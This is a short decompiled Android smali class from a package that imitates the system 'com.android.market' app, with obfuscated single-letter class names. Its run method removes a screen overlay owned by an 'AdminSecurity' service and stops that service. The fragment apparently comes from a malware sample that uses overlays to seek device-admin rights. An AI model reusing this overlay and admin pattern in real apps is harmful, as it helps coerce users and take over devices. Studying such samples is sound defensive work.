.class Lcom/android/market/c;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Lcom/android/market/b;


# direct methods
.method constructor <init>(Lcom/android/market/b;)V
    .locals 0

    iput-object p1, p0, Lcom/android/market/c;->a:Lcom/android/market/b;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 2

    iget-object v0, p0, Lcom/android/market/c;->a:Lcom/android/market/b;

    invoke-static {v0}, Lcom/android/market/b;->a(Lcom/android/market/b;)Lcom/android/market/AdminSecurity;

    move-result-object v0

    iget-object v0, v0, Lcom/android/market/AdminSecurity;->b:Landroid/view/WindowManager;

    iget-object v1, p0, Lcom/android/market/c;->a:Lcom/android/market/b;

    invoke-static {v1}, Lcom/android/market/b;->a(Lcom/android/market/b;)Lcom/android/market/AdminSecurity;

    move-result-object v1

    iget-object v1, v1, Lcom/android/market/AdminSecurity;->d:Landroid/view/View;

    invoke-interface {v0, v1}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V

    iget-object v0, p0, Lcom/android/market/c;->a:Lcom/android/market/b;

    invoke-static {v0}, Lcom/android/market/b;->a(Lcom/android/market/b;)Lcom/android/market/AdminSecurity;

    move-result-object v0

    invoke-virtual {v0}, Lcom/android/market/AdminSecurity;->stopSelf()V

    return-void
.end method
